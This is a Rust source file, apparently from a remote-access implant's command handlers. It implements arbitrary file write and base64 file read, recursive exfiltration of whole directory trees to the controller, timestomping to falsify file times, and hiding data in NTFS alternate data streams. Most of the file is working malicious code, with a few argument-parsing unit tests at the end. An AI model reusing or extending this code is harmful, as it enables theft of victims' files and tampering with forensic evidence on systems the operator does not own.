// src/agent/handlers/files.rs — File operations, directory listing, artifacts

use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::common::CommandResponse;
use crate::file_transfer;
use crate::agent::artifacts;
use crate::lc;
use super::{HandlerContext, DispatchResult, AgentAction, wrap_result};

// ── File Read / Write ──────────────────────────────────────────────────

pub fn handle_file_write(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(3, '|').collect();
    if parts.len() == 3 {
        match file_transfer::write_file_simple(parts[1], parts[2]) {
            Ok(_) => (format!("{}: {}", lc!("File written"), parts[1]), String::new(), 0),
            Err(e) => (String::new(), e, 1),
        }
    } else { (String::new(), lc!("Upload error"), 1) }
}

pub fn handle_file_read(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
    if parts.len() == 2 {
        match file_transfer::read_file_to_b64(parts[1]) {
            Ok((b64, perms)) => (format!("file:data|{}|{}|{}", parts[1], perms, b64), String::new(), 0),
            Err(e) => (String::new(), e, 1),
        }
    } else { (String::new(), lc!("Read error"), 1) }
}

pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: u64) {
    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
    if parts.len() != 2 { return; }
    let root_path = parts[1].to_string();
    let tx = ctx.tx.clone();

    tokio::spawn(async move {
        let files = file_transfer::find_all_files(&root_path);
        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
        let root_name = std::path::Path::new(&root_path).file_name().unwrap_or_default().to_string_lossy().to_string();
        let mut report = file_transfer::RecursiveReport {
            root_path: root_path.clone(), total_files_found: files.len(), total_success: 0, failed_downloads: Vec::new()
        };
        for path in files {
            let path_str = path.to_string_lossy().to_string();
            let rel_path = path_str.clone();
            match file_transfer::read_file_to_b64(&path_str) {
                Ok((b64, perms)) => {
                    let output = format!("file:data_batch|{}|{}|{}|{}|{}", batch_ts, root_name, rel_path, perms, b64);
                    let resp = CommandResponse { request_id: req_id, output, error: String::new(), exit_code: 0 };
                    if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
                    report.total_success += 1;
                    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
                },
                Err(e) => report.failed_downloads.push((path_str, e)),
            }
        }
        let rep_json = serde_json::to_string(&report).unwrap_or_default();
        let final_out = format!("file:report_batch|{}|{}|{}", batch_ts, root_name, rep_json);
        let resp = CommandResponse { request_id: req_id, output: final_out, error: String::new(), exit_code: 0 };
        if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
    });
}

// ── Artifacts (timestomp, secure_delete, ADS) ──────────────────────────

pub fn handle_timestomp(cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 3 {
        return DispatchResult::Reply(String::new(), lc!("Usage: timestomp <target> <reference_file>"), 1, AgentAction::None);
    }
    wrap_result(artifacts::timestomp_copy(parts[1], parts[2]))
}

pub fn handle_timestomp_set(cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 3 {
        return DispatchResult::Reply(String::new(), lc!("Usage: timestomp:set <path> <unix_epoch>"), 1, AgentAction::None);
    }
    match parts[2].parse::<i64>() {
        Ok(epoch) => wrap_result(artifacts::timestomp_epoch(parts[1], epoch)),
        Err(_) => DispatchResult::Reply(String::new(), lc!("Invalid epoch timestamp"), 1, AgentAction::None),
    }
}

pub fn handle_ads_write(cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 4 {
        return DispatchResult::Reply(String::new(), lc!("Usage: ads:write <path> <stream_name> <b64_data>"), 1, AgentAction::None);
    }
    match BASE64.decode(parts[3]) {
        Ok(data) => wrap_result(artifacts::ads_write(parts[1], parts[2], &data)),
        Err(_) => DispatchResult::Reply(String::new(), lc!("Invalid base64"), 1, AgentAction::None),
    }
}

pub fn handle_ads_read(cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 3 {
        return DispatchResult::Reply(String::new(), lc!("Usage: ads:read <path> <stream_name>"), 1, AgentAction::None);
    }
    match artifacts::ads_read(parts[1], parts[2]) {
        Ok(data) => DispatchResult::Reply(BASE64.encode(&data), String::new(), 0, AgentAction::None),
        Err(e) => DispatchResult::Reply(String::new(), e, 1, AgentAction::None),
    }
}

pub fn handle_ads_list(path: &str) -> DispatchResult {
    match artifacts::ads_list(path) {
        Ok(streams) if streams.is_empty() => DispatchResult::Reply(lc!("No alternate data streams found"), String::new(), 0, AgentAction::None),
        Ok(streams) => DispatchResult::Reply(streams.join("\n"), String::new(), 0, AgentAction::None),
        Err(e) => DispatchResult::Reply(String::new(), e, 1, AgentAction::None),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn timestomp_bad_args() {
        match handle_timestomp("timestomp only_one_arg") {
            DispatchResult::Reply(_, err, 1, _) => assert!(err.contains("Usage")),
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn timestomp_set_bad_epoch() {
        match handle_timestomp_set("timestomp:set /tmp/foo not_a_number") {
            DispatchResult::Reply(_, err, 1, _) => assert!(err.contains("epoch")),
            _ => panic!("Expected epoch error"),
        }
    }

    #[test]
    fn ads_write_bad_args() {
        match handle_ads_write("ads:write only two") {
            DispatchResult::Reply(_, err, 1, _) => assert!(err.contains("Usage")),
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn ads_read_bad_args() {
        match handle_ads_read("ads:read only") {
            DispatchResult::Reply(_, err, 1, _) => assert!(err.contains("Usage")),
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn file_write_bad_format() {
        let (_, err, code) = handle_file_write("file:write|no_data");
        assert_eq!(code, 1);
    }

    #[test]
    fn file_read_bad_format() {
        let (_, _, code) = handle_file_read("file:read");
        assert_eq!(code, 1);
    }
}
